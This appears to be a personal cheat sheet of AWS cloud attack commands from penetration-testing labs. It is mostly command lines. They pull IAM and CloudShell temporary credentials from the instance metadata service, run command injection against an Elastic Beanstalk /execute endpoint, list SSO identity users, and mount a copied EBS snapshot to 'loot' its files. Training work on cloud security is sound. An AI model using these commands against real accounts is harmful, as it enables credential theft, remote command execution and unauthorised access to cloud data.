
## Metadata Instance 
```
# List IAM roles attached to the instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary credentials for a specific IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Get instance profile information (ARN, association time)
curl http://169.254.169.254/latest/meta-data/iam/info

# Get AWS region (e.g., us-east-1)
curl http://169.254.169.254/latest/meta-data/placement/region

# Get instance user-data
curl http://169.254.169.254/latest/user-data

# Get the EC2 instance ID
curl http://169.254.169.254/latest/meta-data/instance-id

# Get the EC2 instance type (e.g., t2.micro)
curl http://169.254.169.254/latest/meta-data/instance-type

# Get the instance's hostname
curl http://169.254.169.254/latest/meta-data/hostname

# Get local (private) IP
curl http://169.254.169.254/latest/meta-data/local-ipv4

# Get public IP (if exists)
curl http://169.254.169.254/latest/meta-data/public-ipv4
```
# Cloudshell access 
```
Get IMDSv2 token
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

Get credentials
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"

aws configure 
aws configure set aws_session_token "<token>" 
```

## Elasticbeanstalk 

```
Command injectiion via post
curl -X POST http://hl-app-env.eba-shh7rg7f.us-west-2.elasticbeanstalk.com/execute \
     -H "Content-Type: application/json" \
     -d '{"command": "id"}'

curl -X POST http://<env>.elasticbeanstalk.com/execute \
  -H "Content-Type: application/json" \
  -d '{"command": "env"}'


Matching s3 syntax (elasticbeanstalk-region-idnum)
$ aws s3 ls elasticbeanstalk-us-east-1-243918968627 -recursive
```

## 🔑 Steps for listing SSO Identity users 
requires admin 
```
for id in $(aws sso-admin list-instances | jq -r '.Instances[].IdentityStoreId'); do
  aws identitystore list-users --identity-store-id "$id"
done

```

## 🔑 Steps for EBS Snapshot Exploitation

1️⃣ **Describe available snapshots:**
```bash
aws ec2 describe-snapshots --owner-ids <account_id>
```

2️⃣ **Create a volume from a snapshot:**
```bash
aws ec2 create-volume --snapshot-id snap-xxxx --availability-zone us-east-1a
```

3️⃣ **Attach volume to an EC2 instance:**
```bash
aws ec2 attach-volume --volume-id vol-xxxx --instance-id i-xxxx --device /dev/sdf
```

4️⃣ **SSH into EC2 and mount it:**
```bash
sudo mkdir /mnt/loot
sudo mount /dev/xvdf1 /mnt/loot
ls /mnt/loot
```

## 🗂️ Example:
- Lab 4: Copied public EBS snapshot, created volume, attached to attacker EC2, mounted and looted files.
